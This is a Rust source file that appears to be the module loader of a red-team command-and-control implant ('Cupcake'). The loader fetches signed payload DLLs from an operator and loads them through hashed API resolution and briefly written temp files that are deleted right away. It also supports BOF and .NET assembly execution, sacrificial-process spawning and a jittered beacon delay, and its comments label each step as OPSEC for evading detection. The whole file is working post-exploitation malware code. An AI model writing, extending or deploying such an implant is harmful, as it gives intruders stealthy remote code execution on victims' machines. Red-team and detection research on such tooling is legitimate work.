// Stage0 module loader (L2).
//
// Pipeline: stage (CKMS bytes) → verify HMAC → load (disk short-lived / LoadLibrary)
//         → invoke (mod_invoke) → unload (FreeLibrary + delete residual).
//
// OPSEC (docs/REDESIGN_REDTEAM_STAGED.md §8.2):
// - Load only on operator demand (never bulk-fetch after heartbeat)
// - Prefer in-memory load; disk fallback is short-lived + delete after map
// - Unload must drop mappings/handles/callbacks

use crate::module_package::{self, unpack_and_verify};
use crate::types::CommandResult;
use log::{debug, info};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};

/// Logical module identifiers (server module_id).
pub const MOD_SHELL: &str = "shell";
pub const MOD_FS: &str = "fs";
pub const MOD_PROC: &str = "proc";
pub const MOD_SOCKS: &str = "socks";
pub const MOD_PLUGIN: &str = "plugin";
pub const MOD_BOF: &str = "bof";
pub const MOD_DOTNET: &str = "dotnet";
/// Sacrificial host PE (cupcake-iso-host) — staged bytes only, never LoadLibrary
pub const MOD_ISO_HOST: &str = "iso_host";

/// Map command_type → required L2 module.
///
/// Daily ops (shell / file / process) are **built into** post-ex / minimal profiles —
/// they return None (no module load). Only heavy capabilities are module-gated.
pub fn module_for_command(command_type: &str) -> Option<&'static str> {
    match command_type {
        // Built-in when feature post-ex is enabled (reverse product = minimal)
        "shell" | "shell_interactive" | "file_list" | "file_ls" | "file_upload"
        | "file_download" | "file_upload_chunk" | "file_download_chunk" | "file_delete"
        | "file_mkdir" | "process_list" | "process_kill" => None,
        // Heavy L2 modules (not in reverse/minimal binary by default)
        "bof_exec" => Some(MOD_BOF),
        "execute_assembly" => Some(MOD_DOTNET),
        "plugin_cache" | "plugin_exec" => Some(MOD_PLUGIN),
        _ => None,
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleMeta {
    pub id: String,
    pub version: String,
    pub os: String,
    pub arch: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModuleState {
    Absent,
    /// Bytes received, not yet mapped
    Staged,
    Loaded,
    Failed,
}

/// C ABI of L2 modules (mod_shell, …).
type ModInitFn = unsafe extern "C" fn() -> i32;
type ModInvokeFn = unsafe extern "C" fn(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32;
type ModFreeFn = unsafe extern "C" fn(ptr: *mut u8, len: u32);
type ModShutdownFn = unsafe extern "C" fn() -> i32;

struct LoadedModule {
    /// Library handle (HMODULE as usize). 0 = not a PE module (test/hosted).
    handle: usize,
    temp_path: Option<PathBuf>,
    mod_init: Option<ModInitFn>,
    mod_invoke: Option<ModInvokeFn>,
    mod_free: Option<ModFreeFn>,
    mod_shutdown: Option<ModShutdownFn>,
}

struct ModuleEntry {
    meta: ModuleMeta,
    state: ModuleState,
    /// Staged CKMS blob (cleared after successful load to reduce memory footprint)
    staged: Option<Vec<u8>>,
    /// Verified PE payload (kept briefly during load)
    payload: Option<Vec<u8>>,
    loaded: Option<LoadedModule>,
    /// Host PE bytes (iso_host) — CreateProcess only, not mapped as DLL
    host_pe: Option<Vec<u8>>,
}

/// Process-wide module registry (Stage0).
pub struct ModuleRegistry {
    entries: Mutex<HashMap<String, ModuleEntry>>,
    /// Override key for tests; None → derive from agent AES key / default.
    key_override: Mutex<Option<[u8; 32]>>,
}

impl Default for ModuleRegistry {
    fn default() -> Self {
        Self {
            entries: Mutex::new(HashMap::new()),
            key_override: Mutex::new(None),
        }
    }
}

pub fn registry() -> &'static ModuleRegistry {
    static REGISTRY: OnceLock<ModuleRegistry> = OnceLock::new();
    REGISTRY.get_or_init(ModuleRegistry::default)
}

fn module_key() -> [u8; 32] {
    if let Ok(g) = registry().key_override.lock() {
        if let Some(k) = *g {
            return k;
        }
    }
    // Primary: same material as transport AES (get_aes_key already includes salt KDF)
    let aes = crate::config::get_aes_key();
    if aes.len() >= 16 {
        return module_package::derive_module_key(&aes);
    }
    module_package::default_module_key()
}

/// Candidate keys for verify — tolerate server/agent historical mismatches.
fn module_key_candidates() -> Vec<[u8; 32]> {
    let mut out = Vec::new();
    let mut push = |k: [u8; 32]| {
        if !out.iter().any(|x| x == &k) {
            out.push(k);
        }
    };
    push(module_key());
    // Fallback A: derive from base AES without re-reading salt path (raw template)
    // get_aes_key already salts; also try default for unpatched builds
    push(module_package::default_module_key());
    // Fallback B: if we can rebuild base-only key (pre-salt) — use salt zeros vs empty
    // Session path uses 32-zero salt when unpatched; already in get_aes_key.
    out
}

impl ModuleRegistry {
    /// Tests / offline pack: force module HMAC key.
    pub fn set_key_override(&self, key: Option<[u8; 32]>) {
        if let Ok(mut g) = self.key_override.lock() {
            *g = key;
        }
    }

    pub fn is_loaded(&self, id: &str) -> bool {
        self.entries
            .lock()
            .map(|g| {
                g.get(id)
                    .map(|e| e.state == ModuleState::Loaded)
                    .unwrap_or(false)
            })
            .unwrap_or(false)
    }

    pub fn list_loaded(&self) -> Vec<String> {
        self.entries
            .lock()
            .map(|g| {
                g.iter()
                    .filter(|(_, e)| e.state == ModuleState::Loaded)
                    .map(|(k, _)| k.clone())
                    .collect()
            })
            .unwrap_or_default()
    }

    pub fn note_required(&self, id: &str) {
        info!("[module_loader] module required: {}", id);
        if let Ok(mut g) = self.entries.lock() {
            g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        }
    }

    /// Store CKMS package bytes for later load.
    pub fn stage_bytes(&self, id: &str, bytes: &[u8]) -> Result<(), String> {
        if bytes.is_empty() {
            return Err("empty module blob".into());
        }
        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        e.staged = Some(bytes.to_vec());
        e.state = ModuleState::Staged;
        e.payload = None;
        debug!(
            "[module_loader] staged module {} ({} bytes)",
            id,
            bytes.len()
        );
        Ok(())
    }

    /// Verify staged CKMS, map PE (short disk + LoadLibrary), call mod_init.
    pub fn load(&self, id: &str) -> Result<(), String> {
        let blob = {
            let mut g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g.get_mut(id).ok_or_else(|| format!("module_required:{id}"))?;
            if e.state == ModuleState::Loaded && e.loaded.is_some() {
                return Ok(());
            }
            e.staged
                .take()
                .ok_or_else(|| format!("module_required:{id} (not staged)"))?
        };

        // Try primary + fallback keys (session-derived vs default vs legacy)
        let (pkg_id, payload) = {
            let mut last_err = "HMAC verify failed".to_string();
            let mut ok: Option<(String, Vec<u8>)> = None;
            for k in module_key_candidates() {
                match unpack_and_verify(&blob, &k) {
                    Ok(v) => {
                        ok = Some(v);
                        break;
                    }
                    Err(e) => last_err = e,
                }
            }
            ok.ok_or_else(|| {
                format!(
                    "module verify failed for {id}: {last_err} (check AES/salt match listener; rebuild agent with same key)"
                )
            })?
        };
        if pkg_id != id {
            return Err(format!(
                "module id mismatch: package={pkg_id} expected={id}"
            ));
        }

        // Sacrificial host EXE: keep PE in memory for CreateProcess, do NOT LoadLibrary
        if id == MOD_ISO_HOST
            || id == "iso-host"
            || (payload.len() > 0x40 && payload[0] == b'M' && payload[1] == b'Z' && id.contains("iso"))
        {
            if payload.len() < 64 || payload[0] != b'M' {
                return Err("iso_host payload is not a PE".into());
            }
            let mut g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
            e.host_pe = Some(payload);
            e.state = ModuleState::Loaded;
            e.staged = None;
            e.payload = None;
            e.loaded = None;
            info!("[module_loader] staged iso host PE {} (for PPID spawn)", id);
            return Ok(());
        }

        // Hosted/test payload: magic "HOST" + nothing — mark loaded without PE
        if payload.starts_with(b"HOST") && payload.len() <= 8 {
            let mut g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
            e.state = ModuleState::Loaded;
            e.payload = None;
            e.loaded = Some(LoadedModule {
                handle: 0,
                temp_path: None,
                mod_init: None,
                mod_invoke: None,
                mod_free: None,
                mod_shutdown: None,
            });
            e.host_pe = None;
            info!("[module_loader] loaded hosted stub module {}", id);
            return Ok(());
        }

        let loaded = map_pe_module(&payload).map_err(|e| {
            let mut g = self.entries.lock().ok();
            if let Some(ref mut g) = g {
                if let Some(ent) = g.get_mut(id) {
                    ent.state = ModuleState::Failed;
                }
            }
            e
        })?;

        // mod_init
        if let Some(init) = loaded.mod_init {
            let rc = unsafe { init() };
            if rc != 0 {
                let _ = unmap_loaded(&loaded);
                return Err(format!("mod_init failed rc={rc}"));
            }
        }

        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        e.state = ModuleState::Loaded;
        e.payload = None;
        e.staged = None;
        e.loaded = Some(loaded);
        info!("[module_loader] loaded module {}", id);
        Ok(())
    }

    /// Invoke loaded module. Returns JSON stdout/stderr style result.
    pub fn invoke(
        &self,
        id: &str,
        cmd_type: &str,
        payload: &[u8],
    ) -> Result<CommandResult, String> {
        let (invoke, free_fn) = {
            let g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g.get(id).ok_or_else(|| format!("module not loaded: {id}"))?;
            if e.state != ModuleState::Loaded {
                return Err(format!("module not loaded: {id}"));
            }
            let loaded = e
                .loaded
                .as_ref()
                .ok_or_else(|| format!("module handle missing: {id}"))?;
            // Hosted stub: no PE — used only in unit tests
            if loaded.handle == 0 && loaded.mod_invoke.is_none() {
                return Ok(CommandResult {
                    stdout: format!("hosted:{id}:{cmd_type}"),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                });
            }
            let inv = loaded
                .mod_invoke
                .ok_or_else(|| format!("mod_invoke missing: {id}"))?;
            (inv, loaded.mod_free)
        };

        let ct = cmd_type.as_bytes();
        let mut out_ptr: *mut u8 = std::ptr::null_mut();
        let mut out_len: u32 = 0;
        let rc = unsafe {
            invoke(
                ct.as_ptr(),
                ct.len() as u32,
                payload.as_ptr(),
                payload.len() as u32,
                &mut out_ptr,
                &mut out_len,
            )
        };
        if rc != 0 {
            return Err(format!("mod_invoke rc={rc}"));
        }
        if out_ptr.is_null() || out_len == 0 {
            return Ok(CommandResult {
                stdout: String::new(),
                stderr: String::new(),
                path: None,
                req_id: None,
            });
        }
        let bytes = unsafe { std::slice::from_raw_parts(out_ptr, out_len as usize) }.to_vec();
        if let Some(free) = free_fn {
            unsafe { free(out_ptr, out_len) };
        } else {
            // Best-effort: module should export mod_free
            unsafe {
                let _ = Box::from_raw(std::ptr::slice_from_raw_parts_mut(out_ptr, out_len as usize));
            }
        }

        parse_module_result(&bytes)
    }

    /// Unload + free library + delete residual temp file.
    pub fn unload(&self, id: &str) -> Result<(), String> {
        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        if let Some(e) = g.get_mut(id) {
            if let Some(loaded) = e.loaded.take() {
                if let Some(shutdown) = loaded.mod_shutdown {
                    let _ = unsafe { shutdown() };
                }
                let _ = unmap_loaded(&loaded);
            }
            if let Some(mut pe) = e.host_pe.take() {
                for b in pe.iter_mut() {
                    *b = 0;
                }
            }
            e.state = ModuleState::Absent;
            e.staged = None;
            e.payload = None;
            info!("[module_loader] unloaded {}", id);
        }
        Ok(())
    }
}

fn empty_entry(id: &str) -> ModuleEntry {
    ModuleEntry {
        meta: ModuleMeta {
            id: id.to_string(),
            version: "0.1.0".into(),
            os: std::env::consts::OS.into(),
            arch: std::env::consts::ARCH.into(),
        },
        state: ModuleState::Absent,
        staged: None,
        payload: None,
        loaded: None,
        host_pe: None,
    }
}

impl ModuleRegistry {
    /// Host PE for isolated spawn (clone).
    pub fn get_host_pe(&self, id: &str) -> Option<Vec<u8>> {
        self.entries
            .lock()
            .ok()
            .and_then(|g| g.get(id).and_then(|e| e.host_pe.clone()))
    }
}

fn parse_module_result(bytes: &[u8]) -> Result<CommandResult, String> {
    // Prefer JSON: {"stdout":"...","stderr":"...","path":null}
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(bytes) {
        return Ok(CommandResult {
            stdout: v
                .get("stdout")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            stderr: v
                .get("stderr")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            path: v
                .get("path")
                .and_then(|x| x.as_str())
                .map(|s| s.to_string()),
            req_id: None,
        });
    }
    Ok(CommandResult {
        stdout: String::from_utf8_lossy(bytes).into_owned(),
        stderr: String::new(),
        path: None,
        req_id: None,
    })
}

/// Write PE to short-lived temp path, LoadLibrary, resolve exports, delete file.
fn map_pe_module(pe: &[u8]) -> Result<LoadedModule, String> {
    if pe.len() < 64 {
        return Err("payload too small for PE".into());
    }
    // MZ check
    if pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }

    #[cfg(windows)]
    {
        map_pe_windows(pe)
    }
    #[cfg(not(windows))]
    {
        map_pe_unix(pe)
    }
}

#[cfg(windows)]
fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let mut path = std::env::temp_dir();
    let name = format!(
        "cpx_{:08x}_{:04x}.dll",
        crate::utils::next_u32(),
        (crate::utils::next_u32() & 0xffff) as u16
    );
    path.push(name);

    std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;

    type LoadLibraryWFn = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
    type GetProcAddressFn =
        unsafe extern "system" fn(*mut core::ffi::c_void, *const i8) -> *mut core::ffi::c_void;
    type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

    let (load_lib, get_proc, free_lib) = unsafe {
        let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            let _ = std::fs::remove_file(&path);
            return Err("kernel32 not found".into());
        }
        let ll = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryW"))
            .ok_or_else(|| {
                let _ = std::fs::remove_file(&path);
                "LoadLibraryW missing".to_string()
            })?;
        let gp = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"GetProcAddress"))
            .ok_or_else(|| {
                let _ = std::fs::remove_file(&path);
                "GetProcAddress missing".to_string()
            })?;
        let fl = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
            .ok_or_else(|| {
                let _ = std::fs::remove_file(&path);
                "FreeLibrary missing".to_string()
            })?;
        (
            std::mem::transmute::<usize, LoadLibraryWFn>(ll),
            std::mem::transmute::<usize, GetProcAddressFn>(gp),
            std::mem::transmute::<usize, FreeLibraryFn>(fl),
        )
    };

    let wide: Vec<u16> = OsStr::new(&path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    // OPSEC: brief stack noise before LoadLibrary (heavy modules)
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        crate::stealth::stack::add_stack_noise();
    }

    let handle = unsafe { load_lib(wide.as_ptr()) };
    // Delete on disk ASAP (mapping retained by loader) — reduce on-disk dwell
    let _ = std::fs::remove_file(&path);
    // Best-effort overwrite empty if file reappeared (rare)
    let _ = std::fs::write(&path, b"");
    let _ = std::fs::remove_file(&path);

    if handle.is_null() {
        return Err("LoadLibraryW failed".into());
    }

    unsafe fn resolve(
        get_proc: GetProcAddressFn,
        handle: *mut core::ffi::c_void,
        name: &[u8],
    ) -> Option<usize> {
        let mut buf = Vec::with_capacity(name.len() + 1);
        buf.extend_from_slice(name);
        buf.push(0);
        let p = get_proc(handle, buf.as_ptr() as *const i8);
        if p.is_null() {
            None
        } else {
            Some(p as usize)
        }
    }

    let mod_init = unsafe { resolve(get_proc, handle, b"mod_init").map(|a| std::mem::transmute(a)) };
    let mod_invoke =
        unsafe { resolve(get_proc, handle, b"mod_invoke").map(|a| std::mem::transmute(a)) };
    let mod_free =
        unsafe { resolve(get_proc, handle, b"mod_free").map(|a| std::mem::transmute(a)) };
    let mod_shutdown =
        unsafe { resolve(get_proc, handle, b"mod_shutdown").map(|a| std::mem::transmute(a)) };

    if mod_invoke.is_none() {
        unsafe {
            free_lib(handle);
        }
        return Err("export mod_invoke not found".into());
    }

    // Keep free_lib via handle; FreeLibrary on unload
    let _ = free_lib; // silence if unused path

    Ok(LoadedModule {
        handle: handle as usize,
        temp_path: Some(path), // may already be deleted
        mod_init,
        mod_invoke,
        mod_free,
        mod_shutdown,
    })
}

#[cfg(not(windows))]
fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
    // Linux: short-lived .so + dlopen
    let mut path = std::env::temp_dir();
    let name = format!(
        "cpx_{:08x}_{:04x}.so",
        crate::utils::next_u32(),
        (crate::utils::next_u32() & 0xffff) as u16
    );
    path.push(name);
    std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;

    unsafe {
        let cpath = std::ffi::CString::new(path.to_string_lossy().as_bytes())
            .map_err(|_| "path cstring".to_string())?;
        let handle = libc::dlopen(cpath.as_ptr(), libc::RTLD_NOW);
        let _ = std::fs::remove_file(&path);
        if handle.is_null() {
            return Err("dlopen failed".into());
        }
        let inv_name = std::ffi::CString::new("mod_invoke").unwrap();
        let inv = libc::dlsym(handle, inv_name.as_ptr());
        if inv.is_null() {
            libc::dlclose(handle);
            return Err("export mod_invoke not found".into());
        }
        let init_name = std::ffi::CString::new("mod_init").unwrap();
        let free_name = std::ffi::CString::new("mod_free").unwrap();
        let shut_name = std::ffi::CString::new("mod_shutdown").unwrap();
        let init = libc::dlsym(handle, init_name.as_ptr());
        let free = libc::dlsym(handle, free_name.as_ptr());
        let shut = libc::dlsym(handle, shut_name.as_ptr());

        Ok(LoadedModule {
            handle: handle as usize,
            temp_path: Some(path),
            mod_init: if init.is_null() {
                None
            } else {
                Some(std::mem::transmute(init))
            },
            mod_invoke: Some(std::mem::transmute(inv)),
            mod_free: if free.is_null() {
                None
            } else {
                Some(std::mem::transmute(free))
            },
            mod_shutdown: if shut.is_null() {
                None
            } else {
                Some(std::mem::transmute(shut))
            },
        })
    }
}

fn unmap_loaded(loaded: &LoadedModule) -> Result<(), String> {
    if loaded.handle == 0 {
        return Ok(());
    }
    #[cfg(windows)]
    {
        type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        unsafe {
            let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
            if k32 != 0 {
                if let Some(addr) =
                    crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
                {
                    let free_lib: FreeLibraryFn = std::mem::transmute(addr);
                    free_lib(loaded.handle as *mut core::ffi::c_void);
                }
            }
        }
    }
    #[cfg(not(windows))]
    {
        unsafe {
            libc::dlclose(loaded.handle as *mut core::ffi::c_void);
        }
    }
    if let Some(ref p) = loaded.temp_path {
        let _ = std::fs::remove_file(p);
    }
    Ok(())
}

/// Ensure command's module is loaded; fails with module_required if absent/not staged.
pub fn ensure_module_for_command(command_type: &str) -> Result<(), String> {
    let Some(mod_id) = module_for_command(command_type) else {
        return Ok(());
    };
    if registry().is_loaded(mod_id) {
        return Ok(());
    }
    registry().note_required(mod_id);
    // Try load if already staged
    match registry().load(mod_id) {
        Ok(()) => Ok(()),
        Err(e) if e.contains("module_required") || e.contains("not staged") => {
            Err(format!("module_required:{mod_id}"))
        }
        Err(e) => Err(e),
    }
}

/// Optional L2 shell module invoke (legacy/experimental). Daily reverse uses built-in post-ex.
pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
    if !registry().is_loaded(MOD_SHELL) {
        return Err("module_required:shell".into());
    }
    registry().invoke(MOD_SHELL, "shell", command.as_bytes())
}

/// Invoke loaded `bof` module with base64 COFF + optional base64 args (JSON envelope).
pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
    ensure_module_for_command("bof_exec")?;
    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, coff);
    let args_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, args);
    let payload = serde_json::json!({
        "data": data_b64,
        "args": args_b64,
    });
    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
    registry().invoke(MOD_BOF, "bof_exec", &bytes)
}

/// Invoke loaded `dotnet` module with assembly bytes + string args.
pub fn invoke_dotnet(assembly: &[u8], args: &[String]) -> Result<CommandResult, String> {
    ensure_module_for_command("execute_assembly")?;
    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, assembly);
    let payload = serde_json::json!({
        "data": data_b64,
        "args": args,
    });
    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
    registry().invoke(MOD_DOTNET, "execute_assembly", &bytes)
}

/// Handle module_stage / module_push: id from path/content, data = base64 CKMS.
pub fn handle_module_stage(id: &str, b64_or_raw: &[u8], is_base64: bool) -> Result<String, String> {
    let blob = if is_base64 {
        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64_or_raw)
            .map_err(|e| format!("base64 decode: {e}"))?
    } else {
        b64_or_raw.to_vec()
    };
    registry().stage_bytes(id, &blob)?;
    registry().load(id)?;
    Ok(format!("module {id} staged+loaded"))
}

/// Stage0 OPSEC: startup delay with jitter before first connect.
/// When sleep template is 0, still apply a small default delay for beacon builds.
pub fn stage0_startup_delay_ms() -> u64 {
    let configured = crate::config::get_sleep_time();
    let base = if configured > 0 {
        configured * 1000
    } else {
        // Default OPSEC delay ~3–12s when unset (beacon)
        3000
    };
    // Jitter ±30% using PRNG
    let j = crate::utils::next_u32() as u64 % 61; // 0..60
    let factor = 70 + j; // 70%..130%
    let ms = base.saturating_mul(factor) / 100;
    // Clamp 1s .. 2h
    ms.max(1000).min(7_200_000)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::module_package::{default_module_key, pack_module};
    use std::sync::Mutex;

    /// Serialize tests that touch global registry / key_override.
    fn test_lock() -> std::sync::MutexGuard<'static, ()> {
        static LOCK: Mutex<()> = Mutex::new(());
        LOCK.lock().unwrap_or_else(|e| e.into_inner())
    }

    #[test]
    fn daily_ops_are_not_modules() {
        // Terminal / file / process are built-in (post-ex), not L2 modules
        assert_eq!(module_for_command("shell"), None);
        assert_eq!(module_for_command("shell_interactive"), None);
        assert_eq!(module_for_command("file_list"), None);
        assert_eq!(module_for_command("file_ls"), None);
        assert_eq!(module_for_command("process_list"), None);
        assert_eq!(module_for_command("register"), None);
        // Heavy capabilities remain module-gated
        assert_eq!(module_for_command("bof_exec"), Some(MOD_BOF));
        assert_eq!(module_for_command("execute_assembly"), Some(MOD_DOTNET));
        assert_eq!(module_for_command("plugin_exec"), Some(MOD_PLUGIN));
    }

    #[test]
    fn ensure_fails_when_absent() {
        let _g = test_lock();
        let _ = registry().unload(MOD_BOF);
        let r = ensure_module_for_command("bof_exec");
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("module_required"));
    }

    #[test]
    fn stage_verify_load_hosted_invoke_unload() {
        let _g = test_lock();
        let key = default_module_key();
        registry().set_key_override(Some(key));
        let id = "shell_test_hosted";
        let _ = registry().unload(id);
        let payload = b"HOST";
        let blob = pack_module(id, payload, &key).unwrap();
        registry().stage_bytes(id, &blob).unwrap();
        registry().load(id).unwrap();
        assert!(registry().is_loaded(id));
        let r = registry().invoke(id, "shell", b"whoami").unwrap();
        assert!(r.stdout.contains("hosted:"));
        registry().unload(id).unwrap();
        assert!(!registry().is_loaded(id));
        registry().set_key_override(None);
    }

    #[test]
    fn startup_delay_in_range() {
        let ms = stage0_startup_delay_ms();
        assert!(ms >= 1000);
        assert!(ms <= 7_200_000);
    }

    /// Optional PE load: set CUPCAKE_TEST_MOD_SHELL to path of cupcake_mod_shell.dll
    #[test]
    fn load_real_shell_dll_if_present() {
        let _g = test_lock();
        let path = match std::env::var("CUPCAKE_TEST_MOD_SHELL") {
            Ok(p) if !p.is_empty() => p,
            _ => {
                let candidates = [
                    "target/release/cupcake_mod_shell.dll",
                    "../target/release/cupcake_mod_shell.dll",
                    "modules/shell/../../target/release/cupcake_mod_shell.dll",
                ];
                let found = candidates.iter().find(|p| std::path::Path::new(p).exists());
                match found {
                    Some(p) => p.to_string(),
                    None => {
                        eprintln!("skip: no mod_shell dll (set CUPCAKE_TEST_MOD_SHELL)");
                        return;
                    }
                }
            }
        };
        let pe = match std::fs::read(&path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("skip read {path}: {e}");
                return;
            }
        };
        if pe.len() < 64 || pe[0] != b'M' {
            eprintln!("skip: not PE");
            return;
        }
        let key = default_module_key();
        registry().set_key_override(Some(key));
        // Unique id so we do not collide with MOD_SHELL used by other tests
        let id = "shell_pe_e2e";
        let _ = registry().unload(id);
        let blob = pack_module(id, &pe, &key).expect("pack");
        registry().stage_bytes(id, &blob).expect("stage");
        registry().load(id).expect("load PE module");
        assert!(registry().is_loaded(id));
        let r = registry()
            .invoke(id, "shell", b"help")
            .expect("invoke help");
        // Require substantive hybrid builtin help text (matches executor::BUILTIN_HELP)
        let out = format!("{}{}", r.stdout, r.stderr).to_ascii_uppercase();
        assert!(
            out.contains("CD")
                && (out.contains("DIR") || out.contains("TASKLIST") || out.contains("HELP")),
            "mod_shell help must return hybrid builtin help text; got stdout={:?} stderr={:?}",
            r.stdout,
            r.stderr
        );
        let r2 = registry()
            .invoke(id, "shell", b"echo cupcake_mod_shell_ok")
            .expect("invoke echo");
        assert!(
            r2.stdout.contains("cupcake_mod_shell_ok"),
            "echo builtin must echo marker; stdout={:?} stderr={:?}",
            r2.stdout,
            r2.stderr
        );
        registry().unload(id).expect("unload");
        assert!(!registry().is_loaded(id));
        registry().set_key_override(None);
        eprintln!("OK real PE load+invoke(help+echo)+unload via {path}");
    }

    #[test]
    fn heavy_cmds_require_modules_when_absent() {
        let _g = test_lock();
        let _ = registry().unload(MOD_BOF);
        let r = ensure_module_for_command("bof_exec");
        assert!(r.is_err(), "expected module_required when bof absent");
        assert!(
            r.unwrap_err().contains("module_required"),
            "error must mention module_required"
        );
        // Daily ops never require module load
        assert!(ensure_module_for_command("shell").is_ok());
        assert!(ensure_module_for_command("file_ls").is_ok());
        assert!(ensure_module_for_command("process_list").is_ok());
    }
}
